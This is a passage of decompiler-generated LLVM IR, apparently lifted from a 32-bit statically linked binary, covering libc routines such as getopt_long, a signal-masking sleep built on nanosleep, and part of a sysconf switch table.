  store i32 %v1_806088e, i32* @global_var_807c8a8.801, align 8
  br label %dec_label_pc_8060896

dec_label_pc_8060896:                             ; preds = %dec_label_pc_806086a, %dec_label_pc_8060830, %dec_label_pc_806081f, %dec_label_pc_8060882
  %v0_80608a069 = phi i32 [ %v4_806087c, %dec_label_pc_806086a ], [ %v0_80607b4, %dec_label_pc_8060830 ], [ %v0_80607b4, %dec_label_pc_806081f ], [ %v0_80607b4, %dec_label_pc_8060882 ]
  store i8* null, i8** @global_var_807c8b8.807, align 8
  br label %dec_label_pc_80608a0

dec_label_pc_80608a0:                             ; preds = %dec_label_pc_8060805, %dec_label_pc_8060896
  %v0_80608a0 = phi i32 [ %v0_80607b4, %dec_label_pc_8060805 ], [ %v0_80608a069, %dec_label_pc_8060896 ]
  %v1_80608a2 = mul i32 %v0_80608a0, 16777216
  %v2_80608a2 = sdiv i32 %v1_80608a2, 16777216
  br label %dec_label_pc_80608aa

dec_label_pc_80608a7:                             ; preds = %dec_label_pc_80603c8, %dec_label_pc_806039a, %entry, %dec_label_pc_80603ab
  br label %dec_label_pc_80608aa

dec_label_pc_80608aa:                             ; preds = %dec_label_pc_80608a0, %dec_label_pc_80607fb, %dec_label_pc_80606d8, %dec_label_pc_80606cf, %dec_label_pc_8060663, %dec_label_pc_80603d5, %dec_label_pc_80608a7
  %v0_80608cd = phi i32 [ %v2_80608a2, %dec_label_pc_80608a0 ], [ 63, %dec_label_pc_80607fb ], [ %v3_80606c8, %dec_label_pc_80606d8 ], [ 0, %dec_label_pc_80606cf ], [ %v4_8060691, %dec_label_pc_8060663 ], [ 1, %dec_label_pc_80603d5 ], [ -1, %dec_label_pc_80608a7 ]
  %v0_80608aa = load i32, i32* @global_var_807c8a8.801, align 8
  store i32 %v0_80608aa, i32* @global_var_8073fb8.224, align 8
  %v0_80608b4 = load i32, i32* @global_var_807c8b0.802, align 16
  store i32 %v0_80608b4, i32* @global_var_807e498.218, align 8
  %v0_80608be = load i8, i8* @global_var_807c8b4.814, align 4
  store i8 %v0_80608be, i8* @global_var_8073fc0.822, align 64
  %v2_80608cf = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80608cf, i32* @ebx, align 4
  store i32 %v0_80601b9, i32* @esi, align 4
  store i32 %v0_80601b8, i32* @edi, align 4
  store i32 %v0_80601b7, i32* @ebp, align 4
  ret i32 %v0_80608cd

; uselistorder directives
  uselistorder i32 %v3_80607a8, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v5_8060795, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-52.2, { 1, 0 }
  uselistorder i32 %v2_806051a, { 1, 2, 0 }
  uselistorder i32 %stack_var_-48.137, { 0, 3, 2, 1 }
  uselistorder i32 %v0_8060503, { 7, 4, 2, 0, 1, 5, 6, 3 }
  uselistorder i32 %stack_var_-52.139, { 2, 1, 0 }
  uselistorder i32 %stack_var_-24.040, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8060479, { 0, 1, 3, 2 }
  uselistorder i32 %v1_806046b, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i8* %v3_8060715, { 1, 0, 2 }
  uselistorder i1 %v10_806043a, { 1, 0, 2 }
  uselistorder i8 %v3_8060433, { 1, 0, 2 }
  uselistorder i32 %v5_806042c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_806039a, { 1, 0 }
  uselistorder i32 %v0_80603db, { 1, 2, 0 }
  uselistorder i32 %v1_806034f, { 1, 0, 2 }
  uselistorder i32 %v1_8060340, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8060301.lcssa, { 1, 0 }
  uselistorder i32 %.pre77, { 1, 0 }
  uselistorder i32 %v0_80602f5, { 1, 0 }
  uselistorder i32 %v0_806029d, { 3, 0, 1, 4, 2, 5, 7, 8, 6, 9, 10 }
  uselistorder i8* %v0_806028b, { 1, 0, 2, 3 }
  uselistorder i32 %v3_806079113, { 3, 2, 1, 0 }
  uselistorder i32 %v0_806021e, { 1, 0 }
  uselistorder i32 %v0_80601be., { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %tmp94, { 0, 20, 19, 18, 17, 16, 1, 15, 14, 13, 12, 2, 6, 3, 11, 10, 4, 9, 5, 8, 7 }
  uselistorder i8* @global_var_807c8b4.814, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fprintf, { 10, 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32 (i8*, i32, i32)* @__GI_strncmp, { 12, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 ()* @exchange, { 1, 0 }
  uselistorder i8 43, { 0, 2, 1 }
  uselistorder i8* @global_var_807c8b6.809, { 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_807c8b7.808, { 1, 0 }
  uselistorder i8** @global_var_807c8b8.807, { 15, 14, 13, 12, 1, 11, 10, 9, 8, 7, 6, 5, 0, 4, 3, 2 }
  uselistorder i8* @global_var_807c8b5.803, { 1, 0 }
  uselistorder i8 58, { 1, 2, 3, 4, 5, 13, 14, 15, 16, 6, 7, 8, 9, 10, 17, 11, 12, 0 }
  uselistorder i32* @global_var_807c8a8.801, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 1, 16, 0, 17, 18, 19, 20 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg3, { 3, 2, 1, 0, 4 }
  uselistorder i32* %arg2, { 2, 3, 4, 5, 0, 6, 1, 7, 8 }
  uselistorder i32 %arg1, { 0, 6, 1, 5, 9, 8, 2, 7, 3, 4 }
  uselistorder label %dec_label_pc_80608aa, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80608a7, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_80608a0, { 1, 0 }
  uselistorder label %dec_label_pc_8060896, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_806086a, { 1, 0 }
  uselistorder label %dec_label_pc_80607fb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80607f3, { 1, 0 }
  uselistorder label %dec_label_pc_80607e5, { 1, 0 }
  uselistorder label %dec_label_pc_80606c5, { 1, 0 }
  uselistorder label %dec_label_pc_806069a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8060663, { 1, 0 }
  uselistorder label %dec_label_pc_80605f2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8060555, { 1, 0 }
  uselistorder label %dec_label_pc_8060526, { 1, 0 }
  uselistorder label %dec_label_pc_8060513, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_806051a.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8060480, { 1, 0 }
  uselistorder label %dec_label_pc_8060416, { 1, 0 }
  uselistorder label %dec_label_pc_806040d, { 1, 0 }
  uselistorder label %dec_label_pc_806038f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806037f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8060329, { 1, 0 }
  uselistorder label %dec_label_pc_8060312, { 1, 0 }
  uselistorder label %dec_label_pc_8060307.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80602ef, { 1, 0 }
  uselistorder label %dec_label_pc_80602c1, { 1, 0 }
  uselistorder label %dec_label_pc_80602af, { 1, 0 }
  uselistorder label %dec_label_pc_806028b, { 1, 0 }
  uselistorder label %dec_label_pc_8060284, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806021b, { 1, 0 }
}

define i32 @getopt_long_only(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v6_80608ed = inttoptr i32 %arg2 to i32*
  %v7_80608ed = call i32 @_getopt_internal(i32 %arg1, i32* %v6_80608ed, i32 %arg3, i32 %arg4, i32 %arg5, i32 1)
  ret i32 %v7_80608ed
}

define i32 @getopt_long(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v6_806090f = inttoptr i32 %arg2 to i32*
  %v7_806090f = call i32 @_getopt_internal(i32 %arg1, i32* %v6_806090f, i32 %arg3, i32 %arg4, i32 %arg5, i32 0)
  ret i32 %v7_806090f
}

define i32 @getopt() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v6_806092d = inttoptr i32 %tmp1 to i32*
  %v7_806092d = call i32 @_getopt_internal(i32 %tmp, i32* %v6_806092d, i32 %tmp2, i32 0, i32 0, i32 0)
  ret i32 %v7_806092d

; uselistorder directives
  uselistorder i32 (i32, i32*, i32, i32, i32, i32)* @_getopt_internal, { 2, 0, 1 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8060938 = load i32, i32* @ebp, align 4
  %v0_8060939 = load i32, i32* @edi, align 4
  %v0_806093a = load i32, i32* @esi, align 4
  %v0_806093b = load i32, i32* @ebx, align 4
  %v15_806093c = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_806094e = icmp eq i32 %arg1, 0
  %v1_8060950 = icmp eq i1 %v1_806094e, false
  br i1 %v1_8060950, label %dec_label_pc_8060962.preheader, label %dec_label_pc_8060aaf

dec_label_pc_8060962.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060957

dec_label_pc_8060957:                             ; preds = %dec_label_pc_8060957.dec_label_pc_8060957_crit_edge, %dec_label_pc_8060962.preheader
  %v0_8060957 = phi i32 [ %v15_806093c, %dec_label_pc_8060962.preheader ], [ %v0_8060957.pre, %dec_label_pc_8060957.dec_label_pc_8060957_crit_edge ]
  %v1_806096227 = phi i32 [ 31, %dec_label_pc_8060962.preheader ], [ %v1_8060962, %dec_label_pc_8060957.dec_label_pc_8060957_crit_edge ]
  %v2_8060957 = mul i32 %v1_806096227, 4
  %v3_8060957 = add i32 %v2_8060957, 292
  %v4_8060957 = add i32 %v3_8060957, %v0_8060957
  %v5_8060957 = inttoptr i32 %v4_8060957 to i32*
  store i32 0, i32* %v5_8060957, align 4
  %v0_8060962.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8060962 = add i32 %v0_8060962.pre, -1
  %v9_8060962 = icmp slt i32 %v1_8060962, 0
  store i32 %v1_8060962, i32* %eax.global-to-local, align 4
  %v1_8060963 = icmp eq i1 %v9_8060962, false
  br i1 %v1_8060963, label %dec_label_pc_8060957.dec_label_pc_8060957_crit_edge, label %dec_label_pc_8060965

dec_label_pc_8060957.dec_label_pc_8060957_crit_edge: ; preds = %dec_label_pc_8060957
  %v0_8060957.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8060957

dec_label_pc_8060965:                             ; preds = %dec_label_pc_8060957
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_806097b = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_806097b, i32* @ebx, align 4
  store i32 %v2_806097b, i32* %stack_var_-460, align 4
  %v4_8060983 = call i32 @__sigaddset(i32 %v2_806097b, i32 17, i32 %v1_8060962, i32 %v1_8060962)
  store i32 %v4_8060983, i32* %eax.global-to-local, align 4
  %v2_806098b = icmp slt i32 %v4_8060983, 0
  br i1 %v2_806098b, label %dec_label_pc_8060ab3, label %dec_label_pc_8060993

dec_label_pc_8060993:                             ; preds = %dec_label_pc_8060965
  %v2_8060994 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8060994, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_806099f = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_806099f = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_806099f, i32 %v2_8060994)
  store i32 %v4_806099f, i32* %eax.global-to-local, align 4
  %v1_80609a7 = icmp eq i32 %v4_806099f, 0
  %v1_80609a9 = icmp eq i1 %v1_80609a7, false
  br i1 %v1_80609a9, label %dec_label_pc_8060ab3, label %dec_label_pc_80609af

dec_label_pc_80609af:                             ; preds = %dec_label_pc_8060993
  store i32 %v2_8060994, i32* %stack_var_-460, align 4
  %v4_80609b4 = call i32 @__sigismember(i32 %v2_8060994, i32 17, i32 %v4_806099f, i32 %v4_806099f)
  store i32 %v4_80609b4, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80609c1 = icmp eq i32 %v4_80609b4, 0
  br i1 %v1_80609c1, label %dec_label_pc_80609d5.preheader, label %dec_label_pc_8060a7d

dec_label_pc_80609d5.preheader:                   ; preds = %dec_label_pc_80609af
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80609ca

dec_label_pc_80609ca:                             ; preds = %dec_label_pc_80609ca.dec_label_pc_80609ca_crit_edge, %dec_label_pc_80609d5.preheader
  %v0_80609ca = phi i32 [ %v15_806093c, %dec_label_pc_80609d5.preheader ], [ %v0_80609ca.pre, %dec_label_pc_80609ca.dec_label_pc_80609ca_crit_edge ]
  %v1_80609d526 = phi i32 [ 31, %dec_label_pc_80609d5.preheader ], [ %v1_80609d5, %dec_label_pc_80609ca.dec_label_pc_80609ca_crit_edge ]
  %v2_80609ca = mul i32 %v1_80609d526, 4
  %v3_80609ca = add i32 %v2_80609ca, 292
  %v4_80609ca = add i32 %v3_80609ca, %v0_80609ca
  %v5_80609ca = inttoptr i32 %v4_80609ca to i32*
  store i32 0, i32* %v5_80609ca, align 4
  %v0_80609d5.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_80609d5 = add i32 %v0_80609d5.pre, -1
  %v9_80609d5 = icmp slt i32 %v1_80609d5, 0
  store i32 %v1_80609d5, i32* %edx.global-to-local, align 4
  %v1_80609d6 = icmp eq i1 %v9_80609d5, false
  br i1 %v1_80609d6, label %dec_label_pc_80609ca.dec_label_pc_80609ca_crit_edge, label %dec_label_pc_80609d8

dec_label_pc_80609ca.dec_label_pc_80609ca_crit_edge: ; preds = %dec_label_pc_80609ca
  %v0_80609ca.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80609ca

dec_label_pc_80609d8:                             ; preds = %dec_label_pc_80609ca
  store i32 %v2_806097b, i32* %eax.global-to-local, align 4
  store i32 %v2_806097b, i32* %stack_var_-460, align 4
  %v4_80609e4 = call i32 @__sigaddset(i32 %v2_806097b, i32 17, i32 0, i32 0)
  store i32 %v4_80609e4, i32* %eax.global-to-local, align 4
  %v2_80609ec = icmp slt i32 %v4_80609e4, 0
  br i1 %v2_80609ec, label %dec_label_pc_8060ab3, label %dec_label_pc_80609f4

dec_label_pc_80609f4:                             ; preds = %dec_label_pc_80609d8
  %v2_80609f5 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_80609f5, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_80609fe = call i32 @__GI_sigaction(i32 17, i32* null, i32 %v2_80609f5)
  store i32 %v4_80609fe, i32* %eax.global-to-local, align 4
  %v2_8060a06 = icmp slt i32 %v4_80609fe, 0
  %v1_8060a08 = icmp eq i1 %v2_8060a06, false
  br i1 %v1_8060a08, label %dec_label_pc_8060a32, label %dec_label_pc_8060a0a

dec_label_pc_8060a0a:                             ; preds = %dec_label_pc_80609f4
  %v0_8060a0a = load i32, i32* %stack_var_-460, align 4
  %v1_8060a0a = call i32 @__errno_location(i32 %v0_8060a0a)
  store i32 %v1_8060a0a, i32* %eax.global-to-local, align 4
  store i32 %v1_8060a0a, i32* @ebx, align 4
  %v1_8060a11 = inttoptr i32 %v1_8060a0a to i32*
  %v2_8060a11 = load i32, i32* %v1_8060a11, align 4
  store i32 %v2_8060a11, i32* @esi, align 4
  store i32 %v2_8060994, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8060a20 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8060a20 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8060a20, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8060a2b = load i32, i32* @esi, align 4
  %v1_8060a2b = load i32, i32* @ebx, align 4
  %v2_8060a2b = inttoptr i32 %v1_8060a2b to i32*
  store i32 %v0_8060a2b, i32* %v2_8060a2b, align 4
  %v0_8060ac0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060ab6

dec_label_pc_8060a32:                             ; preds = %dec_label_pc_80609f4
  %v3_8060a32 = load i32, i32* %stack_var_-420, align 4
  %v12_8060a32 = icmp eq i32 %v3_8060a32, 1
  store i32 %v2_8060994, i32* @ebp, align 4
  %v2_8060a3e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8060a3e, i32* @ebx, align 4
  %v1_8060a45 = icmp eq i1 %v12_8060a32, false
  br i1 %v1_8060a45, label %dec_label_pc_8060a6c, label %dec_label_pc_8060a47

dec_label_pc_8060a47:                             ; preds = %dec_label_pc_8060a32
  store i32 %v2_8060a3e, i32* %stack_var_-460, align 4
  %v2_8060a4b = call i32 @nanosleep(i32 %v2_8060a3e, i32 %v2_8060a3e)
  store i32 %v2_8060a4b, i32* %eax.global-to-local, align 4
  store i32 %v2_8060a4b, i32* @edi, align 4
  %v1_8060a52 = call i32 @__errno_location(i32 %v2_8060a3e)
  store i32 %v1_8060a52, i32* %eax.global-to-local, align 4
  store i32 %v1_8060a52, i32* @ebx, align 4
  %v1_8060a5c = inttoptr i32 %v1_8060a52 to i32*
  %v2_8060a5c = load i32, i32* %v1_8060a5c, align 4
  store i32 %v2_8060a5c, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8060a63 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8060a63 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8060a63, i32 0)
  store i32 %v4_8060a63, i32* %eax.global-to-local, align 4
  %v0_8060a68 = load i32, i32* @esi, align 4
  %v1_8060a68 = load i32, i32* @ebx, align 4
  %v2_8060a68 = inttoptr i32 %v1_8060a68 to i32*
  store i32 %v0_8060a68, i32* %v2_8060a68, align 4
  %v0_8060a92.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8060a8f

dec_label_pc_8060a6c:                             ; preds = %dec_label_pc_8060a32
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8060a72 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8060a72 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8060a72, i32 0)
  store i32 %v4_8060a72, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  store i32 %v2_8060994, i32* @ecx, align 4
  br label %dec_label_pc_8060a88

dec_label_pc_8060a7d:                             ; preds = %dec_label_pc_80609af
  %v2_8060a7f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8060a7f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060a88

dec_label_pc_8060a88:                             ; preds = %dec_label_pc_8060a6c, %dec_label_pc_8060a7d
  %storemerge3.pre-phi = phi i32 [ %v2_8060a3e, %dec_label_pc_8060a6c ], [ %v2_8060a7f, %dec_label_pc_8060a7d ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_8060a88 = call i32 @nanosleep(i32 %storemerge3.pre-phi, i32 %storemerge3.pre-phi)
  store i32 %v2_8060a88, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060a8f

dec_label_pc_8060a8f:                             ; preds = %dec_label_pc_8060a47, %dec_label_pc_8060a88
  %v0_8060a92 = phi i32 [ %v0_8060a92.pre, %dec_label_pc_8060a47 ], [ %v2_8060a88, %dec_label_pc_8060a88 ]
  %v1_8060a92 = icmp eq i32 %v0_8060a92, 0
  br i1 %v1_8060a92, label %dec_label_pc_8060aaf, label %dec_label_pc_8060a96

dec_label_pc_8060a96:                             ; preds = %dec_label_pc_8060a8f
  %v4_8060aa6 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8060aa6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060ab6

dec_label_pc_8060aaf:                             ; preds = %entry, %dec_label_pc_8060a8f
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060ab6

dec_label_pc_8060ab3:                             ; preds = %dec_label_pc_80609d8, %dec_label_pc_8060993, %dec_label_pc_8060965
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060ab6

dec_label_pc_8060ab6:                             ; preds = %dec_label_pc_8060aaf, %dec_label_pc_8060a96, %dec_label_pc_8060a0a, %dec_label_pc_8060ab3
  %v0_8060ac0 = phi i32 [ 0, %dec_label_pc_8060aaf ], [ %v4_8060aa6, %dec_label_pc_8060a96 ], [ %v0_8060ac0.pre, %dec_label_pc_8060a0a ], [ -1, %dec_label_pc_8060ab3 ]
  store i32 %v0_806093b, i32* @ebx, align 4
  store i32 %v0_806093a, i32* @esi, align 4
  store i32 %v0_8060939, i32* @edi, align 4
  store i32 %v0_8060938, i32* @ebp, align 4
  ret i32 %v0_8060ac0

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 2, 0, 1 }
  uselistorder i32 %v1_8060a52, { 1, 0, 2 }
  uselistorder i32 %v2_8060a3e, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_80609d5, { 2, 1, 0 }
  uselistorder i32 %v2_8060994, { 0, 3, 2, 5, 4, 1, 6 }
  uselistorder i32 %v2_806097b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8060962, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 7, 8, 9, 10, 14, 3, 1, 11, 12, 13, 15, 4, 5, 2, 6, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8060ab6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8060aaf, { 1, 0 }
  uselistorder label %dec_label_pc_8060a8f, { 1, 0 }
  uselistorder label %dec_label_pc_8060a88, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_8060ae3 [
    i32 0, label %dec_label_pc_8060af3
    i32 1, label %dec_label_pc_8060bd8
    i32 2, label %dec_label_pc_8060afd
    i32 3, label %dec_label_pc_8060b07
    i32 4, label %dec_label_pc_8060b11
    i32 5, label %dec_label_pc_8060ba7
    i32 6, label %dec_label_pc_8060b19
    i32 7, label %dec_label_pc_8060ad9
    i32 8, label %dec_label_pc_8060ad9
    i32 9, label %dec_label_pc_8060ad9
    i32 10, label %dec_label_pc_8060ad9
    i32 11, label %dec_label_pc_8060ad9
    i32 12, label %dec_label_pc_8060ad9
    i32 13, label %dec_label_pc_8060ad9
    i32 14, label %dec_label_pc_8060ad9
    i32 15, label %dec_label_pc_8060ad9
    i32 16, label %dec_label_pc_8060ad9
    i32 17, label %dec_label_pc_8060ad9
    i32 18, label %dec_label_pc_8060ad9
    i32 19, label %dec_label_pc_8060ad9
    i32 20, label %dec_label_pc_8060ad9
    i32 21, label %dec_label_pc_8060ad9
    i32 22, label %dec_label_pc_8060ad9
    i32 23, label %dec_label_pc_8060bd8
    i32 24, label %dec_label_pc_8060bd8
    i32 25, label %dec_label_pc_8060be4
    i32 26, label %dec_label_pc_8060bb5
    i32 27, label %dec_label_pc_8060bd8
    i32 28, label %dec_label_pc_8060b2b
    i32 29, label %dec_label_pc_8060bae
    i32 30, label %dec_label_pc_8060b23
    i32 31, label %dec_label_pc_8060bc3
    i32 32, label %dec_label_pc_8060bd8
    i32 33, label %dec_label_pc_8060bd8
    i32 34, label %dec_label_pc_8060bd8
    i32 35, label %dec_label_pc_8060bbc
    i32 36, label %dec_label_pc_8060beb
    i32 37, label %dec_label_pc_8060bf2
    i32 38, label %dec_label_pc_8060beb
    i32 39, label %dec_label_pc_8060b35
    i32 40, label %dec_label_pc_8060bf9
    i32 41, label %dec_label_pc_8060bd8
    i32 42, label %dec_label_pc_8060bc3
    i32 43, label %dec_label_pc_8060bf2
    i32 44, label %dec_label_pc_8060c00
    i32 45, label %dec_label_pc_8060bf2
    i32 46, label %dec_label_pc_8060bae
    i32 47, label %dec_label_pc_8060bae
    i32 48, label %dec_label_pc_8060bae
    i32 49, label %dec_label_pc_8060bd8
    i32 50, label %dec_label_pc_8060bd8
    i32 51, label %dec_label_pc_8060bae
    i32 52, label %dec_label_pc_8060bae
    i32 53, label %dec_label_pc_8060bd8
    i32 54, label %dec_label_pc_8060bd8
    i32 55, label %dec_label_pc_8060bd8
    i32 56, label %dec_label_pc_8060bd8
    i32 57, label %dec_label_pc_8060bd8
    i32 58, label %dec_label_pc_8060bd8
    i32 59, label %dec_label_pc_8060bd8
    i32 60, label %dec_label_pc_8060bd8
    i32 61, label %dec_label_pc_8060bd8
    i32 62, label %dec_label_pc_8060bd8
    i32 63, label %dec_label_pc_8060bd8
    i32 64, label %dec_label_pc_8060bd8
    i32 65, label %dec_label_pc_8060bd8
    i32 66, label %dec_label_pc_8060bd8
    i32 67, label %dec_label_pc_8060ad9
    i32 68, label %dec_label_pc_8060ad9
    i32 69, label %dec_label_pc_8060bbc
    i32 70, label %dec_label_pc_8060bbc
    i32 71, label %dec_label_pc_8060bbc
    i32 72, label %dec_label_pc_8060bc3
    i32 73, label %dec_label_pc_8060bca
    i32 74, label %dec_label_pc_8060bd1
    i32 75, label %dec_label_pc_8060b3f
    i32 76, label %dec_label_pc_8060bd1
    i32 77, label %dec_label_pc_8060ad9
    i32 78, label %dec_label_pc_8060ad9
    i32 79, label %dec_label_pc_8060ad9
    i32 80, label %dec_label_pc_8060ad9
    i32 81, label %dec_label_pc_8060ad9
    i32 82, label %dec_label_pc_8060ad9
    i32 83, label %dec_label_pc_8060ad9
    i32 84, label %dec_label_pc_8060ad9
    i32 85, label %dec_label_pc_8060bd8
    i32 86, label %dec_label_pc_8060bd8
    i32 87, label %dec_label_pc_8060bb5
    i32 88, label %dec_label_pc_8060b49
    i32 89, label %dec_label_pc_8060b53
    i32 90, label %dec_label_pc_8060bca
    i32 91, label %dec_label_pc_8060ad9
    i32 92, label %dec_label_pc_8060ad9
    i32 93, label %dec_label_pc_8060ad9
    i32 94, label %dec_label_pc_8060ad9
    i32 95, label %dec_label_pc_8060bae
    i32 96, label %dec_label_pc_8060bd8
    i32 97, label %dec_label_pc_8060bd8
    i32 98, label %dec_label_pc_8060ad9
    i32 99, label %dec_label_pc_8060ad9
    i32 100, label %dec_label_pc_8060ad9
    i32 101, label %dec_label_pc_8060b5d
    i32 102, label %dec_label_pc_8060ba0
    i32 103, label %dec_label_pc_8060bdd
    i32 104, label %dec_label_pc_8060bb5
    i32 105, label %dec_label_pc_8060b67
    i32 106, label %dec_label_pc_8060bc3
    i32 107, label %dec_label_pc_8060bc3
    i32 108, label %dec_label_pc_8060ba7
    i32 109, label %dec_label_pc_8060be4
    i32 110, label %dec_label_pc_8060c00
    i32 111, label %dec_label_pc_8060ba0
    i32 112, label %dec_label_pc_8060bdd
    i32 113, label %dec_label_pc_8060c00
    i32 114, label %dec_label_pc_8060b71
    i32 115, label %dec_label_pc_8060bf9
    i32 116, label %dec_label_pc_8060bd8
    i32 117, label %dec_label_pc_8060bd8
    i32 118, label %dec_label_pc_8060b7b
    i32 119, label %dec_label_pc_8060b85
    i32 120, label %dec_label_pc_8060bf2
    i32 121, label %dec_label_pc_8060bb5
    i32 122, label %dec_label_pc_8060bb5
    i32 123, label %dec_label_pc_8060bb5
    i32 124, label %dec_label_pc_8060bb5
    i32 125, label %dec_label_pc_8060ad9
    i32 126, label %dec_label_pc_8060ad9
    i32 127, label %dec_label_pc_8060bd8
    i32 128, label %dec_label_pc_8060bd8
    i32 129, label %dec_label_pc_8060ad9
    i32 130, label %dec_label_pc_8060ad9
    i32 131, label %dec_label_pc_8060bd8
    i32 149, label %dec_label_pc_8060b8c
  ]

dec_label_pc_8060ad9:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060ae3:                             ; preds = %entry
  %v1_8060ae3 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8060ae8 = inttoptr i32 %v1_8060ae3 to i32*
  store i32 22, i32* %v1_8060ae8, align 4
  br label %dec_label_pc_8060bd8

dec_label_pc_8060af3:                             ; preds = %entry
  br label %dec_label_pc_8060c05

